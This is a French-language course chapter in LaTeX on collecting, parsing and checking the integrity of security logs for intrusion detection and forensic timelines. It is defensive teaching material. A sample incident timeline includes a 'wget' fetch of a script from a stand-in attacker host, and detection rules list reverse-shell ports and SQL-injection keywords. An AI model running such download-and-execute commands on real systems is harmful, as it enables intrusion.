@@ -1,0 +1,666 @@
+% ==============================================================================
+% 02_logs.tex — UE SIS589
+% ==============================================================================
+\chapter{Journaux d'Événements~: Collecte, Normalisation et Intégrité}
+\label{chap:logs}
+
+\epigraph{\itshape « Les logs sont la mémoire du système.
+  Celui qui les contrôle contrôle la vérité. »}
+         {--- RFC~3227, \textit{Guidelines for Evidence Collection}}
+
+\begin{boxobjectifs}
+\begin{enumerate}
+  \item Localiser et lire les journaux critiques sur Windows et Linux.
+  \item Analyser les Event IDs Windows essentiels à la détection d'intrusions.
+  \item Interpréter les formats Apache, Syslog~RFC~5424, pfSense.
+  \item Configurer un pipeline de collecte centralisée (Rsyslog + Logstash).
+  \item Détecter des marqueurs de manipulation de journaux.
+  \item Construire une timeline corrélée multi-sources.
+\end{enumerate}
+\end{boxobjectifs}
+
+% ==============================================================================
+\section{Rôle et criticité des journaux}
+\label{sec:logs-role}
+% ==============================================================================
+
+Un journal (\textit{log}) est la trace horodatée d'un événement survenu dans
+un composant informatique. Il remplit trois fonctions~:
+
+\begin{description}
+  \item[Détection.] Alimenter le SIEM pour la corrélation d'alertes en temps réel.
+  \item[Investigation.] Permettre la reconstruction chronologique d'une attaque
+        \textit{a posteriori}.
+  \item[Conformité.] Constituer la preuve documentaire exigée par les référentiels
+        (ISO~27001~A.8.15, PCI-DSS~10, RGPD Art.~30, Loi~2010/012~Cameroun).
+\end{description}
+
+\begin{boxalert}
+\textbf{Principe fondateur d'intégrité.} Un attaquant ayant compromis une
+machine peut effacer les journaux locaux pour masquer ses traces (T1070.001).
+Seule l'expédition \textbf{immédiate et chiffrée} vers un collecteur distant,
+hors de portée de la machine compromise, garantit l'intégrité forensique.
+\textbf{Un journal non exporté en temps réel est un journal potentiellement
+falsifié.}
+\end{boxalert}
+
+% ==============================================================================
+\section{Journaux Windows}
+\label{sec:logs-windows}
+% ==============================================================================
+
+\subsection{Localisation et journaux natifs}
+
+Windows journalise dans des fichiers \texttt{.evtx} accessibles via
+l'Observateur d'événements (\texttt{eventvwr.msc}) ou PowerShell.
+
+\begin{table}[H]
+\centering\small
+\caption{Journaux Windows natifs fondamentaux}
+\label{tab:win-journals}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{4.5cm}p{4.5cm}p{4.5cm}}
+\toprule
+\tableauHeader{Journal} & \tableauHeader{Chemin (.evtx)} &
+\tableauHeader{Contenu clé} \\
+\midrule
+Security &
+\texttt{System32\textbackslash winevt\textbackslash Logs\textbackslash Security.evtx} &
+Authentifications, gestion comptes, politique, audit \\
+System &
+\texttt{...System.evtx} &
+Démarrage, services, drivers, erreurs matérielles \\
+Application &
+\texttt{...Application.evtx} &
+Erreurs applicatives, bases de données \\
+PowerShell/Operational &
+\texttt{...PowerShell\textbackslash Operational.evtx} &
+Exécution et \textbf{contenu} des scripts PS \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsection{Event IDs critiques}
+
+\begin{table}[H]
+\centering\small
+\caption{Event IDs Windows à surveiller en priorité}
+\label{tab:event-ids}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{1.4cm}p{5.5cm}p{2.8cm}p{3.5cm}}
+\toprule
+\tableauHeader{EID} & \tableauHeader{Description} &
+\tableauHeader{Journal} & \tableauHeader{Menace (MITRE)} \\
+\midrule
+\textbf{4624} & Auth. réussie                       & Security & Accès / mouvement latéral \\
+\textbf{4625} & Échec d'authentification             & Security & Brute force (T1110) \\
+\textbf{4648} & Auth. credentials explicites         & Security & Pass-the-hash, runas \\
+\textbf{4672} & Droits spéciaux accordés (SeDebug…) & Security & Élévation de privilèges \\
+\textbf{4720} & Création d'un compte utilisateur    & Security & Persistance (T1136) \\
+\textbf{4728} & Ajout à un groupe global            & Security & Escalade (T1098) \\
+\textbf{4732} & Ajout au groupe Administrators       & Security & \gravite{critique} \\
+\textbf{4776} & Validation NTLM (DC)                & Security & Pass-the-hash (T1550.002) \\
+\textbf{7045} & Nouveau service installé             & System   & Persistance (T1543.003) \\
+\textbf{4698} & Tâche planifiée créée               & Security & Persistance (T1053.005) \\
+\textbf{4103} & Contenu bloc de pipeline PS         & PS/Oper. & Exécution offensive \\
+\textbf{4104} & Création de script PS (ScriptBlock) & PS/Oper. & T1059.001 \\
+\textbf{1102} & Journal Sécurité effacé             & Security & \gravite{critique} Anti-forensics \\
+\textbf{4740} & Compte verrouillé                   & Security & Brute force / lockout DoS \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{boxalert}
+\textbf{EID~1102~: signal d'alarme absolu.}
+En effaçant le journal de sécurité, l'attaquant génère lui-même cette trace.
+Si le SIEM a reçu les événements en temps réel \textbf{avant} l'effacement,
+la chronologie reste reconstituable. C'est l'argument opérationnel principal
+pour l'exportation continue des logs.
+\end{boxalert}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Analyse PowerShell --- échecs d'auth et comptes créés},
+  label={lst:ps-event}]
+# Echecs d'authentification sur 24h, classés par IP source
+Get-WinEvent -FilterHashtable @{
+    LogName   = 'Security'; Id = 4625
+    StartTime = (Get-Date).AddHours(-24) } |
+  Select-Object TimeCreated,
+    @{N='SourceIP';  E={$_.Properties[19].Value}},
+    @{N='Username';  E={$_.Properties[5].Value}},
+    @{N='LogonType'; E={$_.Properties[10].Value}} |
+  Group-Object SourceIP | Sort-Object Count -Desc | Select -First 10
+
+# Comptes créés dans les 7 derniers jours (EID 4720)
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'; Id=4720
+    StartTime=(Get-Date).AddDays(-7) } |
+  Select-Object TimeCreated,
+    @{N='NewAccount'; E={$_.Properties[0].Value}},
+    @{N='CreatedBy';  E={$_.Properties[4].Value}}
+\end{lstlisting}
+
+\subsection{Sysmon~: enrichissement de la télémétrie}
+
+\begin{boxdef}
+\textbf{Sysmon (\textit{System Monitor})~:} Service Microsoft Sysinternals
+(gratuit) installé en tant que driver Windows, journalisant des événements
+à haute valeur forensique absents des journaux natifs~: processus avec
+\textbf{ligne de commande complète et hash SHA-256}, connexions réseau par
+processus, chargement de DLL, injection mémoire, requêtes DNS.
+\end{boxdef}
+
+\begin{table}[H]
+\centering\small
+\caption{Event IDs Sysmon prioritaires}
+\label{tab:sysmon-eids}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{1.4cm}p{4.5cm}p{7.5cm}}
+\toprule
+\tableauHeader{EID} & \tableauHeader{Événement} & \tableauHeader{Valeur de détection} \\
+\midrule
+1  & Création de processus  & Commande complète, hash, PPID, utilisateur \\
+3  & Connexion réseau       & Processus source, IP/port destination \\
+7  & Chargement de DLL      & DLL hijacking, injection \\
+8  & CreateRemoteThread     & Injection de processus (T1055) \\
+11 & Création de fichier    & Dépôt de malware, artefacts \\
+13 & Modification registre  & Persistance, clés Run \\
+22 & Requête DNS            & DGA, tunneling, C2 (T1568.002) \\
+25 & Processus altéré       & Process hollowing (T1055.012) \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{lstlisting}[style=StyleCode, language=YAML,
+  caption={sysmonconfig.xml minimal --- LiZbiZ-SIS},
+  label={lst:sysmon-config}]
+<Sysmon schemaversion="4.90">
+  <HashAlgorithms>sha256,md5</HashAlgorithms>
+  <EventFiltering>
+    <!-- EID 1 : exclure processus natifs bruyants -->
+    <RuleGroup groupRelation="or">
+      <ProcessCreate onmatch="exclude">
+        <Image condition="is">C:\Windows\System32\consent.exe</Image>
+        <Image condition="is">C:\Windows\System32\audiodg.exe</Image>
+      </ProcessCreate>
+    </RuleGroup>
+    <!-- EID 3 : ne capturer que les interpretes de script -->
+    <RuleGroup groupRelation="or">
+      <NetworkConnect onmatch="include">
+        <Image condition="contains">powershell</Image>
+        <Image condition="contains">wscript</Image>
+        <Image condition="contains">cscript</Image>
+        <Image condition="contains">mshta</Image>
+        <DestinationPort condition="is">4444</DestinationPort>
+        <DestinationPort condition="is">1337</DestinationPort>
+      </NetworkConnect>
+    </RuleGroup>
+    <!-- EID 8 : injection memoire — tout capturer -->
+    <CreateRemoteThread onmatch="exclude" />
+    <!-- EID 22 : DNS — exclure domaines Microsoft legitimes -->
+    <DnsQuery onmatch="exclude">
+      <QueryName condition="end with">.microsoft.com</QueryName>
+      <QueryName condition="end with">.windowsupdate.com</QueryName>
+      <QueryName condition="end with">.office.com</QueryName>
+    </DnsQuery>
+  </EventFiltering>
+</Sysmon>
+\end{lstlisting}
+
+% ==============================================================================
+\section{Journaux Linux}
+\label{sec:logs-linux}
+% ==============================================================================
+
+\subsection{Fichiers critiques}
+
+\begin{table}[H]
+\centering\small
+\caption{Journaux Linux critiques pour la sécurité}
+\label{tab:linux-logs}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{5.5cm}p{8cm}}
+\toprule
+\tableauHeader{Fichier} & \tableauHeader{Contenu et valeur} \\
+\midrule
+\texttt{/var/log/auth.log}          & Auth. SSH, su, sudo, PAM. \textbf{Source~\#1} \\
+\texttt{/var/log/syslog}            & Messages système généraux \\
+\texttt{/var/log/kern.log}          & Noyau (rootkits, anomalies mémoire) \\
+\texttt{/var/log/apache2/access.log}& Requêtes HTTP (\textit{every request}) \\
+\texttt{/var/log/apache2/error.log} & Erreurs (tentatives exploitation) \\
+\texttt{/var/log/wtmp}              & Historique connexions (\texttt{last}) \\
+\texttt{/var/log/btmp}              & Connexions échouées (\texttt{lastb}) \\
+\texttt{/var/log/audit/audit.log}   & Auditd (syscalls, fichiers sensibles) \\
+\texttt{\$HOME/.bash\_history}      & Historique commandes (volatile) \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Analyse rapide d'auth.log --- détection brute force et accès suspects},
+  label={lst:linux-auth}]
+# Echecs SSH — derniers 100
+grep "Failed password" /var/log/auth.log | tail -100
+
+# Top IPs attaquantes
+grep "Failed password" /var/log/auth.log | \
+  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20
+
+# Connexions SSH reussies (qui s'est connecte ?)
+grep "Accepted" /var/log/auth.log | \
+  awk '{print $1,$2,$3,"user:"$9,"from:"$11}'
+
+# Commandes sudo (qui a fait quoi en root ?)
+grep "sudo:" /var/log/auth.log | grep "COMMAND" | \
+  awk '{print $1,$2,$3,$NF}'
+
+# Sessions actives en ce moment
+who ; ss -tnp | grep ESTABLISHED
+
+# Historique connexions 30 jours
+last -n 50 | grep -v "^reboot"
+
+# Echecs de connexion (btmp)
+lastb | head -30
+\end{lstlisting}
+
+\subsection{Format Syslog RFC~5424}
+
+\begin{boxdef}
+\textbf{Syslog~:} Protocole standard (RFC~5424) de journalisation pour systèmes
+Unix/Linux et équipements réseau. Structure d'un message~:
+\texttt{<Priority>Version Timestamp Hostname App-Name ProcID MsgID Message}
+\end{boxdef}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Anatomie d'un message Syslog RFC~5424},
+  label={lst:syslog-format}]
+<38>1 2026-04-12T03:14:22.000Z srv-web-01 sshd 1234 - -
+  Accepted publickey for ubuntu from 10.0.1.5 port 52341 ssh2
+
+# Décomposition :
+# <38>  = Priority = (facility × 8) + severity = (4×8)+6 = 38
+#         facility=4 (auth), severity=6 (informational)
+# 1     = Version RFC 5424
+# 2026-04-12T03:14:22.000Z = Timestamp ISO 8601 UTC obligatoire
+# srv-web-01 = Hostname source
+# sshd 1234  = Processus + PID
+# Accepted publickey... = Message libre
+
+# Niveaux de severite (0 = urgence, 7 = debug)
+# 0 emerg  | 1 alert  | 2 crit  | 3 err
+# 4 warning| 5 notice | 6 info  | 7 debug
+# Le SOC surveille 0-4 ; niveau 6 (info) pour les authentifications
+\end{lstlisting}
+
+% ==============================================================================
+\section{Journaux applicatifs et réseau}
+\label{sec:logs-app}
+% ==============================================================================
+
+\subsection{Apache / Nginx}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Format Combined Log Apache et analyse sécurité},
+  label={lst:apache-log}]
+# Format : IP identd user [timestamp] "requete" code taille "referer" "UA"
+203.0.113.42 - - [12/Apr/2026:03:14:22 +0000] \
+  "POST /wp-login.php HTTP/1.1" 401 1234 \
+  "-" "sqlmap/1.7 (https://sqlmap.org)"
+
+# Scanner web : codes 404 en masse par IP
+awk '$9==404{print $1}' access.log | sort | uniq -c | sort -rn | head
+
+# Tentatives SQLi (union, select, etc.)
+grep -iE "(union.*select|insert.*into|drop.*table|--|/\*|xp_|exec.*xp)" \
+  access.log | awk '{print $1,$7}' | head -30
+
+# POST vers .php suspects (webshells)
+awk '$6=="\"POST"' access.log | grep "\.php" | \
+  awk '{print $7}' | sort | uniq -c | sort -rn
+
+# Volume par code HTTP (tableau de bord rapide)
+awk '{print $9}' access.log | sort | uniq -c | sort -rn
+\end{lstlisting}
+
+\subsection{Firewall pfSense}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Log pfSense --- format CSV via Syslog},
+  label={lst:pfsense-log}]
+# Exemple d'entrée pfSense (filterlog)
+Apr 12 03:14:22 pfSense filterlog: 5,,,1000000003,em0,match,block,in,
+  4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.42,10.0.1.10,54321,22,0,S
+
+# Champs clés (séparés par virgule) :
+# [6]  em0          = interface
+# [7]  block/pass   = action
+# [8]  in/out       = direction
+# [17] 203.0.113.42 = IP source
+# [18] 10.0.1.10    = IP destination
+# [19] 54321        = port source
+# [20] 22           = port destination
+# [NF] S            = TCP flags (SYN, ACK, RST, FIN)
+
+# Ports les plus souvent bloqués (scan de ports entrant)
+grep ",block," /var/log/filter.log | \
+  awk -F',' '{print $(NF-3)}' | \
+  sort | uniq -c | sort -rn | head -20
+
+# IPs bloquées le plus souvent
+grep ",block," /var/log/filter.log | \
+  awk -F',' '{print $17}' | \
+  sort | uniq -c | sort -rn | head -20
+\end{lstlisting}
+
+% ==============================================================================
+\section{Architecture de collecte centralisée}
+\label{sec:collecte-centrale}
+% ==============================================================================
+
+\subsection{Composants}
+
+\begin{enumerate}
+  \item \textbf{Agents / expéditeurs.} Processus léger installé sur chaque source~:
+        Wazuh Agent, Filebeat, NXLog, Fluentd. Transmet en temps réel.
+  \item \textbf{Collecteur / broker.} Concentre, normalise, achemine vers le SIEM~:
+        Logstash, Rsyslog, Syslog-ng, Kafka (haute disponibilité).
+  \item \textbf{SIEM / stockage.} Elasticsearch, Splunk~: indexation, corrélation,
+        conservation longue durée.
+\end{enumerate}
+
+\begin{lstlisting}[style=StyleCode, language=YAML,
+  caption={Rsyslog --- expédition TCP chiffré TLS vers SIEM},
+  label={lst:rsyslog-forward}]
+# /etc/rsyslog.d/50-siem.conf  (sur chaque serveur Linux)
+module(load="imtcp")
+
+# Expedier TOUS les logs vers le SIEM (TCP + TLS + authentification mutuelle)
+*.* action(
+    type="omfwd"
+    target="10.0.0.5"               # IP Wazuh/SIEM
+    port="6514"                     # Port TCP avec TLS
+    protocol="tcp"
+    StreamDriver="gtls"
+    StreamDriverMode="1"            # TLS obligatoire
+    StreamDriverAuthMode="x509/name"
+    StreamDriverPermittedPeers="siem.lizbiz.local"
+    queue.type="LinkedList"         # File pour resilience reseau
+    queue.size="50000"
+    action.resumeRetryCount="-1"    # Retry infini
+)
+# Conservation locale 30 jours (sauvegarde en cas de coupure reseau)
+$outchannel local_siem,/var/log/siem-backup.log,524288000,/bin/true
+*.* :omfile:$local_siem
+\end{lstlisting}
+
+\begin{lstlisting}[style=StyleCode, language=YAML,
+  caption={Pipeline Logstash --- parsing multi-source + enrichissement CTI},
+  label={lst:logstash-pipeline}]
+# /etc/logstash/conf.d/lizbiz-sis.conf
+input {
+  beats  { port => 5044 ssl => true ssl_certificate => "/etc/ssl/siem.crt" }
+  syslog { port => 514  type => "syslog" }
+}
+
+filter {
+  # --- Apache access log ---
+  if [type] == "apache-access" {
+    grok { match => { "message" => "%{COMBINEDAPACHELOG}" } }
+    geoip { source => "clientip" }
+    useragent { source => "agent" target => "ua" }
+  }
+
+  # --- SSH auth events ---
+  if [program] == "sshd" {
+    grok { match => { "message" => [
+      "Accepted %{WORD:auth_method} for %{USER:user} from %{IP:src_ip}",
+      "Failed password for %{USER:user} from %{IP:src_ip}"
+    ]}}
+    mutate { add_field => { "event_category" => "authentication" } }
+  }
+
+  # --- Enrichissement CTI : lookup IP dans base IoC MISP/OTX ---
+  translate {
+    field            => "src_ip"
+    destination      => "threat_intel_match"
+    dictionary_path  => "/etc/logstash/ioc_ips.csv"
+    fallback         => "unknown"
+  }
+
+  # --- Normalisation timestamp -> UTC ---
+  date { match => ["timestamp", "dd/MMM/yyyy:HH:mm:ss Z"] }
+
+  # --- Tag les evenements enrichis IoC ---
+  if [threat_intel_match] != "unknown" {
+    mutate { add_tag => ["ioc_match", "requires_triage"] }
+  }
+}
+
+output {
+  elasticsearch {
+    hosts    => ["https://10.0.0.5:9200"]
+    index    => "lizbiz-logs-%{+YYYY.MM.dd}"
+    user     => "logstash_writer"
+    password => "${ELASTIC_PASSWORD}"
+    ssl      => true
+    cacert   => "/etc/ssl/elastic-ca.crt"
+  }
+  # Alerte temps reel si IoC match
+  if "ioc_match" in [tags] {
+    email {
+      to      => "soc@lizbiz.local"
+      subject => "ALERTE IoC --- %{src_ip}"
+      body    => "Correspondance CTI sur %{src_ip} dans %{[log][file][path]}"
+    }
+  }
+}
+\end{lstlisting}
+
+\subsection{Politique de rétention}
+
+\begin{table}[H]
+\centering\small
+\caption{Durées de rétention selon les référentiels}
+\label{tab:retention}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{4cm}p{3.5cm}p{6cm}}
+\toprule
+\tableauHeader{Référentiel} & \tableauHeader{Durée minimale} &
+\tableauHeader{Exigence complémentaire} \\
+\midrule
+ISO~27001:2022 A.8.15  & Définie par PSSI   & Revue annuelle de la politique \\
+PCI-DSS~v4.0 (10.7)    & 12~mois            & 3~mois immédiatement accessibles \\
+RGPD (Art.~5)          & Définie par finalité & Minimisation, justification \\
+ANSSI PA-022           & 12~mois            & 3~mois à chaud \\
+Loi~2010/012 Cameroun  & Non précisée       & Conservation sur demande ANTIC \\
+Directive NIS2 (UE)    & 12~mois            & Notification CSIRT sous 24h \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+% ==============================================================================
+\section{Détection de manipulation de journaux}
+\label{sec:log-tampering}
+% ==============================================================================
+
+\begin{boxdef}
+\textbf{Log tampering (T1070 MITRE ATT\&CK)~:} Suppression, modification
+ou falsification des journaux pour masquer une présence ou des actions.
+Tactique~: \textit{Defense Evasion}.
+\end{boxdef}
+
+Cinq indicateurs de manipulation~:
+
+\begin{enumerate}
+  \item \textbf{Trous temporels.} Absence soudaine de journaux pour une
+        période sur une source active (zéro ligne durant une heure sur
+        un serveur web générant habituellement $>1000$~requêtes/h).
+  \item \textbf{EID~1102 / 104} (Windows)~: effacement du journal de
+        sécurité ou du journal système. Alerte de niveau CRITIQUE immédiate.
+  \item \textbf{Rupture de séquence.} Les journaux Windows contiennent un
+        numéro de séquence incrémental~; une rupture trahit un effacement
+        partiel.
+  \item \textbf{Incohérence de hachage.} Si le SIEM calcule et stocke un
+        SHA-256 pour chaque lot de logs reçu, une divergence révèle une
+        altération en transit ou à la source.
+  \item \textbf{Timestomping (T1070.006)~:} Modification des horodatages
+        MACE (\textit{Modified, Accessed, Created, Entry Modified}) d'un
+        fichier pour brouiller la timeline forensique.
+\end{enumerate}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Détection de trous temporels et d'effacement de journaux},
+  label={lst:detect-tampering}]
+# ─── Linux : détecter un trou temporel dans access.log ──────────────────────
+awk '{print $4}' /var/log/apache2/access.log | \
+  cut -d: -f1,2 | sort | uniq -c
+
+# Résultat suspect :
+#  1423 [12/Apr/2026:01
+#  1687 [12/Apr/2026:02
+#     0 [12/Apr/2026:03   <-- ANOMALIE : silence total 1h sur un serveur actif
+#  1831 [12/Apr/2026:04
+
+# ─── Windows : détecter l'effacement du journal Sécurité (KQL Kibana) ───────
+event.code: "1102" AND winlog.channel: "Security"
+# ou
+event.code: "104"  AND winlog.channel: "System"
+
+# ─── Windows : vérifier la continuité du numéro de séquence ─────────────────
+Get-WinEvent -LogName Security -MaxEvents 1000 |
+  Select-Object RecordId, TimeCreated |
+  Sort-Object RecordId |
+  ForEach-Object {
+    if ($prev -and ($_.RecordId - $prev) -gt 1) {
+      Write-Warning "RUPTURE entre RecordId $prev et $($_.RecordId)"
+    }
+    $prev = $_.RecordId
+  }
+
+# ─── FIM Wazuh : alerte si auth.log est modifié (tronqué) ───────────────────
+# Ajouter dans ossec.conf :
+# <directories check_all="yes" report_changes="yes">/var/log/auth.log</directories>
+# Wazuh génère une alerte de niveau 7 si la taille du fichier diminue.
+\end{lstlisting}
+
+\begin{boxioc}
+\textbf{IoC de log tampering à configurer dans le SIEM}
+\begin{itemize}
+  \item Windows EID~1102~: journal Sécurité effacé → \gravite{critique}, alerte immédiate.
+  \item Windows EID~104~: journal Système effacé → \gravite{critique}.
+  \item Linux~: taille de \texttt{/var/log/auth.log} qui diminue (FIM Wazuh).
+  \item Absence de logs $>5$~min sur une source active connue.
+  \item Modification des timestamps MACE sur les fichiers de log (Sysmon EID~11).
+\end{itemize}
+\end{boxioc}
+
+% ==============================================================================
+\section{Construction d'une timeline corrélée}
+\label{sec:timeline}
+% ==============================================================================
+
+La timeline est la reconstruction chronologique des événements, issue de la
+corrélation de sources hétérogènes. Elle constitue le document central de
+toute investigation forensique.
+
+\textbf{Méthode en cinq étapes~:}
+\begin{enumerate}
+  \item Identifier la fenêtre temporelle (premier IoC connu → confinement).
+  \item Collecter les sources~: SIEM, firewall, serveurs, EDR, DNS, proxy.
+  \item Unifier les timestamps en UTC (documenter les décalages NTP).
+  \item Corréler par entité commune~: IP source, compte utilisateur, hostname.
+  \item Annoter chaque événement avec le TTP MITRE ATT\&CK correspondant.
+\end{enumerate}
+
+\begin{table}[H]
+\centering\small
+\caption{Extrait de timeline corrélée --- incident LiZbiZ-SIS, 12/04/2026}
+\label{tab:timeline}
+\rowcolors{2}{TableauPair}{TableauImpair}
+\begin{tabular}{p{3.4cm}p{2.3cm}p{2.8cm}p{4.5cm}p{1.5cm}}
+\toprule
+\tableauHeader{Timestamp UTC} & \tableauHeader{Source} &
+\tableauHeader{Entité} & \tableauHeader{Événement} &
+\tableauHeader{MITRE} \\
+\midrule
+\timestamp{2026-04-12 02:47:11} & pfSense & 203.0.113.42 &
+Scan SYN port~22, 150~paquets/s & T1595 \\
+\timestamp{2026-04-12 03:14:22} & auth.log & 203.0.113.42 &
+7~échecs SSH / 45s (root, admin, backup) & T1110.001 \\
+\timestamp{2026-04-12 03:14:51} & auth.log & 203.0.113.42 &
+Authentification SSH réussie (user: backup) & T1078 \\
+\timestamp{2026-04-12 03:17:03} & Sysmon EID~1 & backup@srv-web-01 &
+\texttt{wget http://evil.io/lp.sh} exécuté & T1059.004 \\
+\timestamp{2026-04-12 03:17:41} & Sysmon EID~3 & srv-web-01 &
+Connexion sortante C2 185.220.101.5:443 & T1071.001 \\
+\timestamp{2026-04-12 03:21:15} & Security EID~4624 & srv-web-01 &
+Mouvement latéral SMB vers srv-erp-01 & T1021.002 \\
+\timestamp{2026-04-12 03:48:00} & Security EID~1102 & srv-erp-01 &
+Journal de sécurité effacé & T1070.001 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{lstlisting}[style=StyleTerminal,
+  caption={Construction de timeline avec Plaso / log2timeline},
+  label={lst:log2timeline}]
+# Plaso — extraction multi-source vers une super-timeline
+pip install plaso --break-system-packages
+
+# Étape 1 : parser toutes les sources dans un fichier .plaso
+log2timeline.py \
+  --parsers syslog,apache_access,winevtx,winsuperlog,sysmonxml \
+  timeline.plaso /evidence/lizbiz-srv-web-01/
+
+# Étape 2 : filtrer sur la fenêtre de l'incident et exporter CSV
+psort.py -o l2tcsv \
+  -q "date > '2026-04-12 02:00:00' AND date < '2026-04-12 06:00:00'" \
+  timeline.plaso > incident_20260412.csv
+
+# Alternative rapide sans Plaso (grep multi-sources)
+grep "12/Apr/2026:03:1[0-9]" /var/log/apache2/access.log
+grep "Apr 12 03:1[0-9]" /var/log/auth.log
+grep "Apr 12 03:1[0-9]" /var/log/syslog
+# Trier par timestamp
+cat incident_*.log | sort -k1,3 | less
+\end{lstlisting}
+
+% ==============================================================================
+\section*{Résumé}
+% ==============================================================================
+
+\begin{boxresume}
+\begin{itemize}
+  \item Trois fonctions des logs~: détection, investigation, conformité.
+        Exportation en temps réel = intégrité.
+  \item Windows~: Security/System/PowerShell/Operational. EIDs critiques~:
+        4625, 4672, 4720, 4732, 1102. Sysmon enrichit (EID~1,3,8,22).
+  \item Linux~: \texttt{auth.log}, \texttt{syslog}, logs applicatifs.
+        Format Syslog RFC~5424 (priority = facility×8 + severity).
+  \item Pipeline~: Agent~→~Collecteur (Rsyslog/Logstash)~→~SIEM.
+        Transport TLS obligatoire. Rétention minimale~: 12~mois.
+  \item Log tampering (T1070)~: détecter par EID~1102, trous temporels,
+        ruptures de séquence, FIM Wazuh.
+  \item Timeline~: unifier UTC, corréler par entité, annoter MITRE ATT\&CK.
+\end{itemize}
+\end{boxresume}
+
+\begin{boxexo}
+\textbf{Ex.~2.1 — Analyse d'un fichier access.log.}
+À partir du fichier fourni en TP, identifiez~: (a)~les IP générant le
+plus de codes~401~; (b)~les URI cibles de tentatives SQLi~;
+(c)~les User-Agents suspects. Produisez une fiche d'alerte de 10~lignes.
+
+\medskip\textbf{Ex.~2.2 — Configuration Rsyslog.}
+Rédigez \texttt{/etc/rsyslog.d/50-siem.conf} pour qu'un Ubuntu~22.04
+expédie vers le SIEM (10.0.0.5:6514 TCP TLS) tous les journaux de
+niveau \texttt{warning} et supérieur, avec file d'attente persistante
+de 10~000~messages.
+
+\medskip\textbf{Ex.~2.3 — Analyse de la timeline.}
+À partir du tableau~\ref{tab:timeline}~: (a)~durée entre le premier
+scan et la première connexion réussie~; (b)~EID confirmant l'effacement~;
+(c)~technique MITRE du mouvement latéral~; (d)~deux mesures qui auraient
+interrompu la chaîne dès l'étape 3.
+\end{boxexo}
